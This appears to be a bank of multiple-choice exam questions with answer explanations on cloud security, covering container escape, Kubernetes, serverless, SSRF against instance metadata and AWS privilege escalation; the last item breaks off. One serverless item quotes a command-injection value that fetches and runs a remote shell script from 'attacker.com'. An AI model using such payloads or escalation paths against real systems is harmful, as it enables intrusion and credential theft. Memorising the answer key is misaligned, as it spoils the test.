questions.name: Cloud Computing
questions.keyword: cloud computing concepts service models deployment
questions.text: Which three terms correctly identify the primary cloud computing service models as defined by NIST SP 800-145?

answers.text: Infrastructure as a Service (IaaS), Platform as a Service (PaaS), and Software as a Service (SaaS)
Public, Private, and Hybrid
Compute, Storage, and Networking
On-premises, Colocation, and Managed Services

explanations.a: NIST SP 800-145 defines three cloud service models: IaaS (provider manages physical infrastructure and virtualization; customer manages OS, middleware, and applications), PaaS (provider manages OS and runtime; customer manages applications and data), and SaaS (provider manages the entire stack; customer manages only user-level configuration and data).
explanations.b: Public, Private, and Hybrid describe cloud deployment models — how the cloud infrastructure is owned and shared — not the service models. Deployment models describe the relationship between providers and consumers, while service models describe the division of management responsibility.
explanations.c: Compute, Storage, and Networking are infrastructure resource categories commonly offered within IaaS environments but are not the names of the service models themselves.
explanations.d: On-premises, Colocation, and Managed Services describe data center deployment strategies for physical infrastructure and are not NIST-defined cloud service models.

questions.name: Cloud Computing
questions.keyword: cloud computing concepts service models deployment
questions.text: A startup wants to deploy a web application without managing the underlying operating system, web server software, or runtime environment — they want to focus only on writing and deploying application code. Which cloud service model BEST meets this requirement?

answers.text: IaaS — because it provides the most infrastructure flexibility
PaaS — because the provider manages the OS, runtime, and middleware
SaaS — because the provider manages the complete application stack
FaaS — because functions eliminate all server management entirely

explanations.a: IaaS provides virtualized compute, storage, and networking, but the customer is still responsible for installing and managing the OS, web server, runtime libraries, and application. This does not meet the requirement of avoiding OS and runtime management.
explanations.b: PaaS (Platform as a Service) is specifically designed for this use case — the cloud provider manages the OS, web server, runtime environment, and middleware, while the customer deploys and manages only the application code and its data. AWS Elastic Beanstalk, Google App Engine, and Heroku are common PaaS examples.
explanations.c: SaaS delivers fully managed applications to end users (e.g., Salesforce, Gmail). While the entire stack is managed by the provider, customers consume the application as-is and cannot deploy custom code — this does not fit a startup building their own web application.
explanations.d: FaaS (Function as a Service / serverless) is an even more granular model than PaaS where code runs in stateless functions triggered by events. While it eliminates server management, it is an event-driven execution model and is not the same as PaaS, which hosts full applications. FaaS is a subset of serverless computing.

questions.name: Cloud Computing
questions.keyword: cloud computing concepts service models deployment
questions.text: Which cloud deployment model connects on-premises infrastructure with public cloud resources via dedicated network links or VPN, allowing workloads to move between environments based on capacity or compliance requirements?

answers.text: Community cloud — shared infrastructure for organizations with common interests
Public cloud — all resources hosted by a third-party provider
Hybrid cloud — on-premises and public cloud resources connected and orchestrated together
Multi-cloud — simultaneous use of multiple public cloud providers

explanations.a: A community cloud is shared infrastructure provisioned exclusively for a specific community of organizations with common compliance or mission requirements (e.g., government agencies, healthcare providers). It does not describe the on-premises-to-public-cloud connectivity model.
explanations.b: A public cloud is hosted entirely by a third-party provider and shared among multiple tenants. There is no on-premises component — all resources reside in the provider's data centers.
explanations.c: A hybrid cloud integrates on-premises (or private cloud) infrastructure with public cloud resources, connected via dedicated links (such as AWS Direct Connect or Azure ExpressRoute) or VPN. This allows organizations to keep sensitive workloads on-premises while leveraging public cloud capacity for scalability, or to burst to the cloud during peak demand.
explanations.d: Multi-cloud describes simultaneously using multiple public cloud providers (e.g., AWS for compute, Azure for AI services, GCP for analytics). It does not specifically describe the connection between on-premises infrastructure and a public cloud environment.

questions.name: Cloud Computing
questions.keyword: cloud computing concepts service models deployment
questions.text: A financial institution must keep customer transaction data on dedicated hardware due to regulatory requirements, cannot share compute resources with other organizations, but wants to eliminate on-premises data center capital expenditure. Which cloud deployment model BEST satisfies all three constraints?

answers.text: Public cloud with VPC isolation and dedicated instances
Community cloud shared with other regulated financial institutions
Hybrid cloud splitting workloads between on-premises and public cloud
Private cloud hosted by a managed service provider on dedicated hardware

explanations.a: Public cloud dedicated instances (e.g., AWS Dedicated Hosts) provide hardware isolation at the physical server level, but the broader infrastructure (networking equipment, data centers) remains shared with the provider's other customers. For regulators requiring fully isolated dedicated infrastructure with documented custody, this may be insufficient.
explanations.b: A community cloud is shared among multiple organizations with common interests. Even though participants are in the same industry, the infrastructure is shared among tenants — violating the requirement that resources not be shared with other organizations.
explanations.c: A hybrid cloud still places some workloads in a public cloud environment with shared infrastructure. The regulatory requirement for dedicated hardware excludes any deployment model where hardware is shared with other cloud customers.
explanations.d: A private cloud hosted by a managed service provider (MSP) on dedicated hardware meets all three constraints: (1) dedicated hardware satisfies the regulatory isolation requirement, (2) no shared compute with other organizations, and (3) the MSP manages the infrastructure, eliminating on-premises capital expenditure. This is increasingly common among regulated financial institutions using providers such as IBM Cloud or private managed colocation services.

questions.name: Cloud Computing
questions.keyword: container technology docker kubernetes security
questions.text: What is the fundamental architectural difference between a container and a traditional virtual machine?

answers.text: Containers share the host OS kernel and isolate at the process level; VMs run separate guest OS instances on a hypervisor
Containers are slower than VMs due to the additional abstraction layer between the application and hardware
VMs share the host OS kernel while containers each run their own isolated OS kernel
Containers require a Type-1 hypervisor while VMs can run directly on bare metal hardware

explanations.a: Containers (e.g., Docker) share the host operating system's kernel and use Linux namespaces and cgroups to isolate processes, filesystems, and network stacks at the OS level. Virtual machines run a complete separate guest OS on top of a hypervisor (Type-1 or Type-2), with no kernel sharing. This makes containers lighter and faster to start, but means a kernel vulnerability can potentially affect all containers on the host.
explanations.b: Containers are generally faster and more lightweight than VMs, not slower — they start in milliseconds versus seconds for VMs because they don't boot a full OS. This option inverts the actual performance characteristic.
explanations.c: This option inverts the reality. VMs do NOT share the host OS kernel — each VM runs its own guest OS. Containers share the host kernel, making kernel-level isolation the key security boundary.
explanations.d: Containers do not require a hypervisor — they rely on Linux kernel features (namespaces, cgroups, seccomp). Hypervisors are required for virtual machines, not containers.

questions.name: Cloud Computing
questions.keyword: container technology docker kubernetes security
questions.text: A Docker container is running as root and has been started with a bind mount that exposes the host's root filesystem (/) into the container at /hostfs. Which attack does this configuration MOST directly enable?

answers.text: Cross-container script injection targeting adjacent containers
Container escape to read, modify, or execute files on the host system
Denial of service against the Docker daemon by exhausting file descriptors
SQL injection against a database running in a sibling container

explanations.a: Cross-container script injection would target vulnerabilities in web applications running in adjacent containers, not the host filesystem. A bind mount exposing the host root filesystem is not related to inter-container web application attacks.
explanations.b: When a container runs as root AND has a bind mount exposing the host root filesystem, an attacker who compromises the container effectively has root access to the host filesystem through /hostfs. They can read sensitive files (SSH keys, /etc/shadow), modify system configurations, write cron jobs or init scripts for persistence, or overwrite host binaries — achieving a complete container escape to host compromise.
explanations.c: Denial of service via file descriptor exhaustion is a resource attack unrelated to the bind mount configuration. Exhausting file descriptors would not leverage the host filesystem exposure.
explanations.d: SQL injection targets application-level database query vulnerabilities. The described host filesystem exposure is a container escape vector, not a path to SQL injection attacks against sibling containers.

questions.name: Cloud Computing
questions.keyword: container technology docker kubernetes security
questions.text: An attacker compromises a running pod in a Kubernetes cluster and discovers the pod's service account has been granted cluster-admin ClusterRoleBinding. Which action is the attacker MOST likely to take next?

answers.text: Brute-force the Kubernetes API server's TLS certificate to gain cluster access
Launch a volumetric DDoS attack using the pod's network bandwidth
Use the service account token to call the Kubernetes API and create privileged pods, read Secrets, or pivot to other namespaces
Perform ARP cache poisoning to intercept traffic between pods in the same node

explanations.a: Brute-forcing the Kubernetes API TLS certificate is not a viable attack technique — TLS certificates are not brute-forceable. If the attacker already has cluster-admin credentials via the service account token, they have no need to attack the TLS layer.
explanations.b: Launching a DDoS from the compromised pod wastes the attacker's elevated privilege position. A cluster-admin service account token is highly valuable for persistent access, data theft, and lateral movement — not network-level attacks that would quickly trigger detection.
explanations.c: A cluster-admin ClusterRoleBinding grants unrestricted access to all Kubernetes API resources. With the mounted service account token, an attacker can use kubectl (or direct API calls) to: create new privileged pods with hostPath mounts for container escape, read Kubernetes Secrets (including credentials and API keys), access resources in all namespaces, and establish persistent backdoor access. This is the highest-impact exploitation path.
explanations.d: ARP poisoning is a Layer 2 network attack targeting the local network segment. While containers on the same node share a network bridge, ARP poisoning is a noisy, low-value technique compared to leveraging a cluster-admin token for full cluster control.

questions.name: Cloud Computing
questions.keyword: container technology docker kubernetes security
questions.text: A security audit reveals that a production Kubernetes cluster has the kubelet API exposed on TCP port 10250 with anonymous authentication enabled and authorization mode set to AlwaysAllow. What is the MOST critical security impact of this configuration?

answers.text: Network performance degradation from unauthenticated kubelet health check polling
Loss of container image integrity due to unsigned image pull operations through the kubelet
Exposure of container stdout logs to unauthorized users on the same network segment
Unauthenticated remote code execution on cluster nodes via the kubelet exec API endpoint

explanations.a: Unauthenticated health check polling would cause minimal performance impact and is not a critical security risk. The kubelet API exposure is a remote code execution risk, not a performance concern.
explanations.b: Container image signing and pull integrity are managed by admission controllers and image policy webhooks, not the kubelet authentication configuration. This is an unrelated security concern.
explanations.c: Log exposure is a confidentiality concern but is not the most critical risk. Unauthenticated log access, while problematic, is significantly less severe than full remote code execution capability.
explanations.d: The kubelet API with anonymous access and AlwaysAllow authorization allows any network-accessible user to invoke the /exec, /run, and /attach endpoints without credentials. This enables unauthenticated remote command execution inside any container on the node (via exec API), and by extension potential container escape to the underlying node through privileged operations. CVE-2018-1002105 and multiple Kubernetes security advisories specifically warn about kubelet API exposure — it is one of the highest-severity Kubernetes misconfigurations.

questions.name: Cloud Computing
questions.keyword: serverless computing functions attack surface
questions.text: Which characteristic of serverless functions MOST significantly expands the application attack surface compared to a traditional monolithic web server deployment?

answers.text: Multiple event trigger sources (HTTP, queues, storage events, streams) introduce injection and input validation risks at every integration point
Serverless functions always expose public IP addresses that are directly accessible from the internet
Serverless functions cannot implement TLS encryption for event payload transmission
All serverless functions automatically receive administrator-level cloud account permissions at runtime

explanations.a: Serverless functions can be triggered by a wide variety of event sources: API Gateway HTTP requests, SQS queues, S3 object events, DynamoDB streams, SNS notifications, scheduled events, and more. Each trigger type represents a separate input channel that must be validated and sanitized. Attackers can inject malicious payloads through any of these sources — a single function might process input from five different untrusted sources, each requiring its own validation logic.
explanations.b: Serverless functions do not have persistent IP addresses. They run in provider-managed infrastructure and, unless specifically placed in a VPC with public subnet configuration, are not directly accessible via IP. HTTP-triggered functions are accessed through an API gateway with its own endpoint.
explanations.c: Serverless functions support TLS for both inbound triggers (via HTTPS API Gateway endpoints) and outbound connections. TLS support is standard and not a unique limitation of serverless computing.
explanations.d: Serverless functions run with the permissions granted by an explicitly assigned execution role or service account — they do not automatically receive administrator-level permissions. Least-privilege IAM roles are a core serverless security best practice precisely because the principle is not enforced by default.

questions.name: Cloud Computing
questions.keyword: serverless computing functions attack surface
questions.text: A Lambda function receives a filename parameter from an API Gateway request and constructs a shell command: os.system('convert ' + filename + ' output.png'). An attacker submits the value 'input.jpg; curl http://attacker.com/shell.sh | bash'. Which vulnerability class does this represent?

answers.text: Insecure Direct Object Reference (IDOR) — the attacker is accessing another user's file
Event injection leading to OS command injection in the serverless function
Server-Side Request Forgery (SSRF) — the function is making a request to an attacker-controlled server
XML External Entity (XXE) injection — the filename parameter is processed as XML input

explanations.a: IDOR occurs when an attacker can reference another user's resources by modifying an object identifier (e.g., changing user_id=123 to user_id=124). The filename parameter here is used to inject shell commands, not to access another user's stored object.
explanations.b: This is a classic event injection attack leading to OS command injection (OWASP Serverless Top 10: SAS-3 — Functions Event-Data Injection). The unvalidated filename parameter is passed directly into a shell command. The attacker injects a semicolon to terminate the convert command and executes arbitrary shell commands under the Lambda function's execution role. In serverless environments, this is particularly dangerous because the function may have cloud API permissions attached.
explanations.c: SSRF involves tricking a server into making HTTP requests to internal or attacker-controlled endpoints on behalf of the application. While the injected payload does make an outbound HTTP request (curl to attacker.com), the root cause and primary vulnerability is the OS command injection that enables arbitrary command execution — not SSRF.
explanations.d: XXE injection targets XML parsers that process external entity references in XML input. The filename parameter is a string used in a shell command — there is no XML parsing occurring in this scenario.

questions.name: Cloud Computing
questions.keyword: serverless computing functions attack surface
questions.text: A development team assigns an IAM role with AdministratorAccess to all Lambda functions to simplify permission management. Why is this practice a CRITICAL security risk in serverless environments?

answers.text: Lambda functions with AdministratorAccess IAM roles cannot be invoked by API Gateway and will fail at runtime
Lambda functions with broad IAM roles consume significantly more memory and incur higher execution costs
If any function is compromised via injection or vulnerable dependency, the attacker gains full administrative control over the entire AWS account
AdministratorAccess roles cause Lambda functions to exceed the maximum execution timeout of 15 minutes

explanations.a: IAM role permissions have no effect on whether a Lambda function can be invoked by API Gateway — invocation permissions are controlled by Lambda resource-based policies, not the execution role. A Lambda with AdministratorAccess runs normally when triggered by API Gateway.
explanations.b: IAM role permissions do not affect memory consumption or execution costs. Lambda pricing is based on memory allocation and execution duration, not on the breadth of IAM permissions attached to the execution role.
explanations.c: Lambda functions with AdministratorAccess inherit those permissions at runtime. If an attacker exploits a vulnerability in the function (event injection, vulnerable npm/pip dependency, SSRF to metadata service), they can call any AWS API with full administrative rights — creating backdoor IAM users, exfiltrating all S3 data, deleting resources, or pivoting to other services. The blast radius of a single compromised function equals the blast radius of a compromised AWS root account. OWASP Serverless Top 10 specifically lists over-privileged function permissions as a critical risk (SAS-7).
explanations.d: IAM role permissions have no relationship to the Lambda execution timeout. The maximum execution timeout (15 minutes) is a function configuration setting unrelated to the attached IAM role.

questions.name: Cloud Computing
questions.keyword: serverless computing functions attack surface
questions.text: An attacker exploits an SSRF vulnerability in a Lambda function to make HTTP requests to the EC2 Instance Metadata Service (IMDS) at 169.254.169.254. What is the attacker's MOST likely primary objective in this cloud SSRF attack?

answers.text: Causing the Lambda function to crash and triggering a denial-of-service condition
Enumerating the private IP addresses of other Lambda functions in the same VPC
Bypassing the function's maximum 15-minute execution timeout restriction
Retrieving temporary AWS IAM credentials from the metadata service to call AWS APIs as the function's execution role

explanations.a: Crashing the Lambda function via SSRF to the metadata service is not a meaningful attack objective — it would only cause a temporary service disruption and would waste the SSRF vulnerability on a low-impact outcome. Causing a crash does not grant the attacker any persistent access or data.
explanations.b: The IMDS endpoint (169.254.169.254) returns metadata specific to the current instance or function — it does not enumerate other functions or their IP addresses. Lambda functions in a VPC have elastic network interfaces, but their IPs are not discoverable via the IMDS of a different function.
explanations.c: Execution timeouts are a Lambda configuration setting enforced by the AWS runtime environment. SSRF requests to the IMDS cannot modify execution timeout settings — these are platform-controlled constraints.
explanations.d: The Lambda IMDS endpoint exposes temporary AWS security credentials for the function's execution role at /latest/meta-data/iam/security-credentials/<role-name>. Retrieving these credentials (Access Key, Secret Key, Session Token) allows the attacker to authenticate to AWS APIs with the same permissions as the Lambda execution role — potentially enabling privilege escalation, data exfiltration, or lateral movement across the AWS account. This is a well-documented cloud SSRF attack chain (MITRE ATT&CK T1552.005 — Cloud Instance Metadata API).

questions.name: Cloud Computing
questions.keyword: cloud computing threats misconfiguration data breaches
questions.text: According to the Cloud Security Alliance (CSA) and major cloud security research, which threat category has been the most frequent root cause of significant cloud data breaches and security incidents?

answers.text: Zero-day exploits targeting cloud provider hypervisor software
Cloud misconfiguration and inadequate change control
Malicious insider threats from cloud provider employees
Advanced nation-state attacks against cloud provider infrastructure

explanations.a: Hypervisor zero-days (such as VM escape vulnerabilities) are extremely rare, technically complex, and typically patched rapidly by cloud providers. They do not represent the most common cause of cloud breaches — misconfiguration is far more prevalent.
explanations.b: Cloud misconfiguration is consistently identified by the CSA (Cloud Security Alliance Top Threats reports) and security researchers as the leading cause of cloud data breaches. Common misconfigurations include publicly accessible S3 buckets, open security groups, disabled logging, and excessive IAM permissions. The 2019 Capital One breach (100 million records) and numerous S3 exposure incidents exemplify this threat category.
explanations.c: Cloud provider employee insider threats are a real but statistically rare risk. Cloud providers implement strict background checks, access controls, and technical isolation to prevent employee access to customer data. Misconfiguration by cloud customers is far more prevalent.
explanations.d: Nation-state attacks against cloud provider core infrastructure are rare and would affect all customers simultaneously — these incidents would be major geopolitical events. Customer-side misconfiguration remains the dominant root cause of actual cloud breaches.

questions.name: Cloud Computing
questions.keyword: cloud computing threats misconfiguration data breaches
questions.text: During a cloud security assessment, a penetration tester discovers an AWS S3 bucket containing unencrypted customer PII that is accessible without any authentication via an unauthenticated HTTP GET request. Which misconfiguration MOST likely caused this public exposure?

answers.text: Server-side encryption was disabled on the S3 bucket, making objects accessible without decryption keys
S3 bucket versioning was not enabled, allowing objects to be overwritten without audit trails
The S3 Block Public Access settings were disabled and a bucket policy or ACL grants s3:GetObject to the wildcard principal
The S3 bucket's VPC endpoint routing was configured incorrectly, bypassing private network access controls

explanations.a: Server-side encryption (SSE) protects data confidentiality at rest — it does not control public access to objects. Even with SSE enabled, if the bucket policy grants public access, anyone can download the objects (AWS handles decryption transparently for authorized requests). Encryption does not restrict who can access the bucket.
explanations.b: S3 bucket versioning controls object version history and protects against accidental deletion or overwriting. Lack of versioning creates data recovery risks but does not cause public unauthenticated access.
explanations.c: AWS S3 public access is controlled by two layers: (1) S3 Block Public Access settings (account-level and bucket-level toggles that override permissive policies) and (2) bucket policies or ACLs that grant s3:GetObject to Principal '*' (all principals). Both must be permissive for a bucket to be publicly accessible without authentication. This combination — Block Public Access disabled and a wildcard-principal bucket policy — is the defining misconfiguration behind S3 data exposure incidents.
explanations.d: VPC endpoints route S3 traffic through private AWS network connections, bypassing the public internet. Incorrect VPC endpoint routing might cause connectivity issues for private resources but would not cause a bucket to become publicly accessible from the internet.

questions.name: Cloud Computing
questions.keyword: cloud computing threats misconfiguration data breaches
questions.text: An attacker successfully takes over an AWS account after finding long-term IAM access keys committed to a public GitHub repository. The keys had been there for six months. Which cloud security principle was MOST critically violated that enabled this attack?

answers.text: Defense in depth — no secondary security layers existed around the exposed API keys
Least privilege — the IAM keys had permissions beyond what the application required
Availability — the account owner lost control of their own cloud resources
Secrets management — credentials were stored in source code instead of a dedicated secrets management service

explanations.a: Defense in depth is a relevant concern — additional controls like AWS GuardDuty anomaly detection could have detected unusual API calls from the exposed keys. However, the root cause enabling the attack was not a missing secondary layer; it was the fundamental mistake of storing secrets in source code.
explanations.b: Least privilege addresses what the keys can do after they are obtained. While overly broad permissions worsen the impact, the root cause of the compromise is the exposure of the keys in the first place through insecure storage in source code — not what permissions were attached.
explanations.c: Availability is a CIA triad component describing system accessibility. While the account takeover affects the legitimate owner's access, availability is the consequence of the attack, not the violated security principle that caused it.
explanations.d: Secrets management is the security practice of storing, rotating, and controlling access to credentials, API keys, and other sensitive values using dedicated systems (AWS Secrets Manager, HashiCorp Vault, AWS Parameter Store) rather than source code, configuration files, or environment variables. Hardcoding credentials in source code — especially code committed to a public repository — is one of the most common and preventable cloud security mistakes, enabling automated credential harvesting bots that continuously scan GitHub for exposed secrets.

questions.name: Cloud Computing
questions.keyword: cloud computing threats misconfiguration data breaches
questions.text: During testing of a multi-tenant SaaS application, a security researcher modifies the tenant_id parameter in an authenticated API request from their own tenant ID to another customer's tenant ID and successfully retrieves that customer's records. Which vulnerability class does this represent, and why is it particularly severe in multi-tenant cloud environments?

answers.text: Insecure Direct Object Reference (IDOR) — exploits missing tenant-level authorization checks, and is severe because it enables cross-tenant data access at application scale
SQL injection — the tenant_id is used in a database query without parameterization
Cross-Site Request Forgery (CSRF) — forged requests are made on behalf of another tenant's session
Session hijacking — the attacker has stolen another tenant's session token to access their data

explanations.a: Insecure Direct Object Reference (IDOR) occurs when an application uses a user-controlled identifier to access objects without validating that the requesting user is authorized to access that specific object. In a multi-tenant SaaS context, IDOR in tenant-scoped resources is particularly severe because: (1) a single application serves thousands of tenants, (2) one vulnerability exposes all tenants' data to any authenticated user, and (3) tenant data isolation is the foundational security guarantee of a multi-tenant platform. This is classified under OWASP Top 10 A01:2021 — Broken Access Control.
explanations.b: SQL injection would involve malicious SQL syntax injected into the parameter to manipulate database queries. Simply changing a numeric tenant ID to another valid tenant ID — without special SQL characters — does not constitute SQL injection. The application correctly queries the database but returns the wrong tenant's data due to missing authorization checks.
explanations.c: CSRF involves forging authenticated requests that a victim's browser submits unknowingly. The described attack involves the researcher directly modifying the API request parameter themselves — they are already authenticated and are exploiting a missing authorization check, not forging another session.
explanations.d: Session hijacking involves stealing or forging another user's session token to impersonate them. The researcher is using their own valid session and simply changing a parameter — no session theft is involved. Their own authentication is valid; the flaw is the absence of tenant-level authorization verification.

questions.name: Cloud Computing
questions.keyword: cloud hacking methodology enumeration exploitation
questions.text: Which framework, developed by Rhino Security Labs, is specifically designed as an AWS post-exploitation and attack simulation tool, providing modules for IAM enumeration, privilege escalation, and lateral movement within AWS environments?

answers.text: CloudSploit
Pacu
Prowler
ScoutSuite

explanations.a: CloudSploit is an open-source cloud security scanning tool that assesses AWS, Azure, GCP, and Oracle Cloud configurations for compliance and security misconfigurations. It is a defensive configuration auditing tool, not an offensive exploitation framework.
explanations.b: Pacu is an open-source AWS exploitation framework developed by Rhino Security Labs, modeled after Metasploit for AWS environments. It provides attack modules for IAM enumeration and privilege escalation, S3 data exfiltration, EC2 lateral movement, Lambda exploitation, and CloudTrail log tampering. It is the standard tool for offensive AWS penetration testing.
explanations.c: Prowler is an open-source AWS security assessment tool that performs hundreds of security checks based on CIS AWS Foundations Benchmark and AWS security best practices. Like CloudSploit, it is a defensive auditing tool, not an offensive exploitation framework.
explanations.d: ScoutSuite is a multi-cloud security auditing tool (by NCC Group) that evaluates configurations across AWS, Azure, GCP, and other platforms. It generates security posture reports for defenders and auditors — it is not designed for offensive exploitation or post-compromise attack simulation.

questions.name: Cloud Computing
questions.keyword: cloud hacking methodology enumeration exploitation
questions.text: During a cloud penetration test, a tester discovers their IAM user has been granted the iam:PassRole permission. Which attack does this permission MOST enable, and why?

answers.text: Reading all S3 bucket contents across the account by bypassing bucket policies
Creating new IAM users with administrative permissions without iam:CreateUser
Privilege escalation by assigning a high-privilege role to an AWS service the tester controls, then operating as that service
Disabling CloudTrail logging to conceal subsequent attack activity

explanations.a: iam:PassRole does not grant read access to S3 buckets. S3 access is controlled by bucket policies and IAM policies granting s3:GetObject or s3:ListBucket. PassRole and S3 access are unrelated permissions.
explanations.b: Creating IAM users requires the iam:CreateUser permission, not iam:PassRole. These are separate, distinct IAM actions. PassRole cannot substitute for or bypass the CreateUser permission.
explanations.c: iam:PassRole allows the holder to assign (pass) an IAM role to an AWS service such as EC2, Lambda, or ECS. A privilege escalation attack works as follows: (1) identify a high-privilege role (e.g., AdministratorAccess) whose trust policy allows the target service, (2) create or control an EC2 instance or Lambda function, (3) use iam:PassRole to assign the privileged role to that resource, (4) operate as that resource to inherit its elevated permissions. This is a documented AWS privilege escalation technique identified by Rhino Security Labs (IAM Privilege Escalation via PassRole).
explanations.d: Disabling CloudTrail requires cloudtrail:StopLogging or cloudtrail:DeleteTrail permissions, which are entirely separate from iam:PassRole. PassRole is specifically about assigning roles to services, not manipulating logging configurations.

questions.name: Cloud Computing
questions.keyword: cloud hacking methodology enumeration exploitation
questions.text: A cloud attacker exploiting an SSRF vulnerability sends requests to http://169.254.169.254/latest/meta-data/iam/security-credentials/ and retrieves temporary AWS IAM credentials. Which version of the EC2 Instance Metadata Service (IMDS) would have blocked this attack by default?

answers.text: IMDSv1 with rate limiting configured on the metadata endpoint
IMDSv1 with the instance profile detached from the EC2 instance
IMDSv1 with IP table rules blocking access from the application subnet
IMDSv2, which requires a session token obtained via an authenticated PUT request before GET requests are processed

explanations.a: IMDSv1 rate limiting is not a native IMDS feature, and rate limiting alone would not prevent an SSRF attack — it would only slow it down. IMDSv1 has no authentication requirement and is inherently vulnerable to SSRF credential theft regardless of request rate.
explanations.b: Detaching the instance profile removes the credentials from the metadata service entirely, which would prevent credential theft but also breaks all legitimate applications using the instance role. This is a workaround, not an IMDS security version, and it eliminates the role entirely rather than securing its access.
explanations.c: iptables rules blocking metadata access from the application subnet would prevent the SSRF exploit but require manual firewall rules on each instance. This is not an IMDS version feature and is operationally difficult to maintain at scale.
explanations.d: IMDSv2 (introduced in 2019) requires a two-step process: first, a PUT request to http://169.254.169.254/latest/api/token with a TTL header retrieves a session token; subsequent GET requests to retrieve metadata must include this token. Standard SSRF attacks via GET-only HTTP requests cannot retrieve the session token (PUT requests are typically blocked by SSRF defenses like browser same-origin policy and server-side HTTP libraries that restrict PUT to external redirects). AWS recommends requiring IMDSv2 on all instances to mitigate SSRF-based credential theft.

questions.name: Cloud Computing
questions.keyword: cloud hacking methodology enumeration exploitation
questions.text: A red team operator holds stolen read-only AWS access keys. Through enumeration, they discover a Lambda function whose execution role has iam:AttachRolePolicy and iam:CreatePolicy permissions. How can the operator leverage this discovery to achieve privilege escalation without directly modifying the stolen user's IAM policies?

answers.text: Invoke the Lambda function with crafted input that triggers the function's execution role to attach AdministratorAccess to itself, then retrieve credentials via the metadata service
Use the read-only keys to call sts:AssumeRole and directly assume the Lambda execution role
Query CloudTrail logs to find administrator credentials stored in historical API call parameters
Exploit the Lambda VPC attachment to pivot directly into internal EC2 instances

explanations.a: This is a documented AWS privilege escalation technique: the Lambda execution role has iam:AttachRolePolicy and iam:CreatePolicy permissions. The operator can invoke the Lambda function (using their read-only keys' lambda:InvokeFunction permission if present, or trigger it via its event source) with a crafted payload that causes the function's code to: (1) create a new IAM policy granting AdministratorAccess, (2) attach that policy to the Lambda execution role or to the attacker's user, and (3) the attacker then retrieves temporary credentials via the function's IMDS endpoint. The escalation exploits the Lambda role's permissions, not the stolen user's directly.
explanations.b: sts:AssumeRole for a Lambda execution role requires that the role's trust policy explicitly allows the caller (the stolen user's ARN or role) to assume it. Lambda execution roles typically have trust policies allowing only lambda.amazonaws.com to assume them, not individual IAM users. The read-only keys alone cannot assume the Lambda role.
explanations.c: CloudTrail logs record API calls and their parameters, but IAM credentials are not logged in CloudTrail — only the calling identity, not the credentials themselves, appear in logs. API call parameters are partially redacted for sensitive values. This is not a viable privilege escalation path.
explanations.d: VPC attachment enables Lambda functions to access private VPC resources. Exploiting the VPC attachment to pivot into EC2 instances requires network-level access to those instances and would not constitute privilege escalation within the IAM/cloud permission model — it is lateral movement, not privilege escalation.

questions.name: Cloud Computing
questions.keyword: cloud security shared responsibility model controls
questions.text: In the AWS Shared Responsibility Model, which security domain remains the customer's exclusive responsibility across ALL service models (IaaS, PaaS, and SaaS)?

answers.text: Physical security of the data center hardware and environmental controls
Security of customer data and management of customer identity and access
Patching and securing the underlying hypervisor and virtualization layer
Maintenance of global network infrastructure and hardware replacement cycles

explanations.a: Physical security of AWS data centers (including hardware, environmental controls, and facility access) is always AWS's responsibility, regardless of service model. No customer is ever responsible for physical data center security in a cloud deployment.
explanations.b: Customer data and identity/access management (IAM) are always the customer's responsibility regardless of service model. In IaaS, customers also manage OS, applications, and network configuration. In PaaS, the customer manages applications and data. In SaaS, the customer manages only user accounts and data. The common thread across all models is that the customer is always responsible for their data and for who can access it.
explanations.c: Hypervisor patching and security is always AWS's responsibility. AWS manages the virtualization layer entirely — customers never have access to or responsibility for the hypervisor, regardless of whether they use IaaS, PaaS, or SaaS.
explanations.d: Global network infrastructure (AWS backbone, hardware, edge locations) is always AWS's responsibility. Customers configure virtual networking (VPC, subnets, security groups) but never manage the underlying physical network hardware.

questions.name: Cloud Computing
questions.keyword: cloud security shared responsibility model controls
questions.text: A company migrates from a self-managed on-premises data center to AWS EC2 (IaaS). Under the AWS Shared Responsibility Model, which security responsibility does the company NOW own that was previously managed by their internal infrastructure team?

answers.text: Physical access controls and environmental security of server hardware
Patching and securing the underlying hypervisor and virtualization platform
Operating system patching, application security, and security group firewall configuration
Maintaining redundancy in global network backbone infrastructure and hardware

explanations.a: Physical security of server hardware is now AWS's responsibility — this is a key benefit of cloud migration. The company's internal team no longer owns physical facility security, hardware maintenance, or environmental controls. This responsibility transfers to AWS.
explanations.b: Hypervisor security and patching is AWS's responsibility in all service models. The company's team never manages the virtualization layer in AWS — this was previously managed by the on-premises team but is now AWS's domain.
explanations.c: In IaaS (EC2), the customer is responsible for: (1) patching the guest operating system (EC2 does not auto-patch Linux or Windows), (2) securing applications deployed on the instance, and (3) configuring security groups (EC2 firewalls) and network ACLs correctly. These responsibilities transfer from AWS's infrastructure team to the customer's security team — and are common sources of misconfiguration in cloud environments.
explanations.d: Global network infrastructure maintenance was never the on-premises team's responsibility (they managed their LAN/WAN, not backbone infrastructure), and it is not the customer's responsibility in AWS either. AWS owns all backbone and hardware.

questions.name: Cloud Computing
questions.keyword: cloud security shared responsibility model controls
questions.text: A security team wants to implement a solution that continuously evaluates their cloud infrastructure configurations against security benchmarks (CIS, PCI DSS, HIPAA) and alerts on deviations such as publicly accessible storage buckets or unrestricted security groups. Which tool category addresses this requirement?

answers.text: Cloud Access Security Broker (CASB)
Web Application Firewall (WAF)
Security Information and Event Management (SIEM)
Cloud Security Posture Management (CSPM)

explanations.a: A Cloud Access Security Broker (CASB) controls and monitors access to cloud applications (SaaS), enforcing policies on data sharing, user behavior, and compliance. CASBs focus on user-to-cloud application access, not on evaluating infrastructure configuration against security benchmarks.
explanations.b: A Web Application Firewall (WAF) inspects and filters HTTP/HTTPS traffic to web applications, blocking attacks like SQLi and XSS. WAFs protect application traffic in real time and do not perform configuration assessment against compliance frameworks.
explanations.c: A SIEM collects, correlates, and analyzes log data and security events from multiple sources to detect threats and support incident response. SIEMs process runtime events and logs — they do not continuously assess infrastructure configuration states against compliance benchmarks.
explanations.d: Cloud Security Posture Management (CSPM) tools (such as Prisma Cloud, Wiz, AWS Security Hub, or Microsoft Defender for Cloud) are specifically designed to continuously assess cloud infrastructure configurations against security standards, identify misconfigurations, and track compliance posture over time. They directly address the scenario's requirement for benchmark-based configuration monitoring and misconfiguration alerting.

questions.name: Cloud Computing
questions.keyword: cloud security shared responsibility model controls
questions.text: A security architect is designing a Zero Trust architecture for a cloud-native environment where developers access production AWS resources. Which combination of controls BEST operationalizes Zero Trust principles for this use case?

answers.text: Identity-based micro-segmentation, MFA with short-lived credentials via AWS STS, and just-in-time least-privilege IAM access with automated privilege revocation
Perimeter firewall rules at each VPC boundary restricting access by source IP allowlist
Full disk encryption for all EBS volumes combined with VPN tunnels for all developer access
